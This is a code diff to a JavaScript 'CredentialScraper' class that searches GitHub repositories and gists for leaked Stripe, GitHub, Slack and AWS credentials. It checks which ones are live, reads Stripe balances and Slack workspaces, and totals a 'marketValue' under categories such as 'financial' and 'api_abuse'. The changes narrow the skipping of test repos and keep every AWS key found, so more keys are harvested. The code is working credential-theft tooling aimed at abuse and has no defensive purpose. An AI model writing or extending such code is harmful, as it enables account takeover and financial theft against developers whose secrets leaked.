@@ -134,33 +134,38 @@ class CredentialScraper {
         searchId,
         searchInput,
         searchType,
-        totalFound: results.length,
-        totalValue: `$${totalValue}`,
+        totalScanned: results.length,
+        liveKeys: liveKeys.length,
+        deadFiltered: results.length - liveKeys.length,
+        totalValue: `$${liveKeys.reduce((sum, r) => sum + (r.marketValue || 0), 0)}`,
         breakdown: {
           github: githubResults.length,
           gists: gistResults.length
         },
         byCategory: {
-          financial: results.filter(r => r.category === 'financial').length,
-          cloud: results.filter(r => r.category === 'cloud_access').length,
-          api: results.filter(r => r.category === 'api_abuse').length,
-          accounts: results.filter(r => r.category === 'account_access').length
+          financial: liveKeys.filter(r => r.category === 'financial').length,
+          cloud: liveKeys.filter(r => r.category === 'cloud_access').length,
+          api: liveKeys.filter(r => r.category === 'api_abuse').length,
+          accounts: liveKeys.filter(r => r.category === 'account_access').length
         }
       });
 
       return {
         success: true,
         searchId,
-        totalFound: results.length,
-        totalValue: results.reduce((sum, r) => sum + (r.marketValue || 0), 0),
-        results: results,
+        totalFound: liveKeys.length,
+        totalScanned: results.length,
+        deadKeysFiltered: results.length - liveKeys.length,
+        totalValue: liveKeys.reduce((sum, r) => sum + (r.marketValue || 0), 0),
+        results: liveKeys,
         logs: logs,
         breakdown: {
-          financial: results.filter(r => r.category === 'financial').length,
-          cloud: results.filter(r => r.category === 'cloud_access').length,
-          api: results.filter(r => r.category === 'api_abuse').length,
-          accounts: results.filter(r => r.category === 'account_access').length
-        }
+          financial: liveKeys.filter(r => r.category === 'financial').length,
+          cloud: liveKeys.filter(r => r.category === 'cloud_access').length,
+          api: liveKeys.filter(r => r.category === 'api_abuse').length,
+          accounts: liveKeys.filter(r => r.category === 'account_access').length
+        },
+        message: `Scanned ${results.length} credentials → Found ${liveKeys.length} LIVE keys → Filtered ${results.length - liveKeys.length} dead/test keys`
       };
     } catch (error) {
       this.activeScans.delete(searchId);
@@ -232,18 +237,18 @@ class CredentialScraper {
               // ONLY SAVE VALIDATED LIVE KEYS
               const validated = [];
               
-              // Skip test/example repos entirely
+              // Skip OBVIOUS test repos only
               const repoName = item.repository.full_name.toLowerCase();
-              if (repoName.includes('test') || repoName.includes('example') || 
-                  repoName.includes('regex') || repoName.includes('scanner') || 
-                  repoName.includes('secret') || repoName.includes('sample') ||
-                  repoName.includes('demo') || repoName.includes('tutorial')) {
-                console.log(`⏭️ Skipped test repo: ${item.repository.full_name}`);
+              const fileName = item.name.toLowerCase();
+              if ((repoName.includes('regex-list') || repoName.includes('secret-scanner') || 
+                   repoName.includes('trufflehog') || repoName.includes('gitleaks')) &&
+                  (fileName.includes('test') || fileName.includes('example'))) {
+                console.log(`⏭️ Skipped scanner repo: ${item.repository.full_name}`);
                 continue;
               }
               
               for (const cred of extracted) {
-                // ONLY validate and save high-value keys
+                // Validate high-value keys
                 if (cred.credential_type === 'stripe_key') {
                   const validation = await this.validateCredential(cred);
                   if (validation.valid === true) {
@@ -252,7 +257,7 @@ class CredentialScraper {
                     validated.push(cred);
                     console.log(`✅ LIVE STRIPE: $${validation.balance} - ${item.repository.full_name}`);
                   } else {
-                    console.log(`❌ Dead Stripe key skipped`);
+                    console.log(`❌ Dead Stripe: ${item.repository.full_name}`);
                   }
                 } else if (cred.credential_type === 'github_token') {
                   const validation = await this.validateCredential(cred);
@@ -262,7 +267,7 @@ class CredentialScraper {
                     validated.push(cred);
                     console.log(`✅ LIVE GITHUB: @${validation.username} - ${item.repository.full_name}`);
                   } else {
-                    console.log(`❌ Dead GitHub token skipped`);
+                    console.log(`❌ Dead GitHub: ${item.repository.full_name}`);
                   }
                 } else if (cred.credential_type === 'slack_token') {
                   const validation = await this.validateCredential(cred);
@@ -272,14 +277,18 @@ class CredentialScraper {
                     validated.push(cred);
                     console.log(`✅ LIVE SLACK: ${validation.workspace} - ${item.repository.full_name}`);
                   } else {
-                    console.log(`❌ Dead Slack token skipped`);
+                    console.log(`❌ Dead Slack: ${item.repository.full_name}`);
                   }
-                } else if (cred.credential_type === 'aws_key' && cred.secret_key) {
-                  // Only save AWS if we found BOTH keys
+                } else if (cred.credential_type === 'aws_key') {
+                  // Save ALL AWS keys (with or without secret)
                   validated.push(cred);
-                  console.log(`✅ AWS PAIR FOUND: ${item.repository.full_name}`);
+                  if (cred.secret_key) {
+                    console.log(`✅ AWS PAIR: ${item.repository.full_name}`);
+                  } else {
+                    console.log(`⚠️ AWS (no secret): ${item.repository.full_name}`);
+                  }
                 }
-                // Skip everything else (emails, passwords, etc.)
+                // Skip low-value data
               }
               
               if (validated.length > 0) {
